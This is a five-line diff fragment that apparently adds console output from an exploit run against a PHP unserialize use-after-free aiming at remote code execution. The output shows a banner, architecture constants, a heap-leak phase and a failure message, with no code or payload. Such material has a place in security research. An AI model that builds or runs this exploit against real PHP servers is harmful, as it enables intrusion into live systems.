@@ -1,0 +1,5 @@
+=== PHP Serializable var_hash UAF → RCE ===
+    Arch: x86_64    ADDR_MAX=0x7fffffffffff    DELTA_MAX=0x300
+
+[*] Phase 1: Heap address leak via R: write-through...
+[-] heap_leak: no spray modification detected
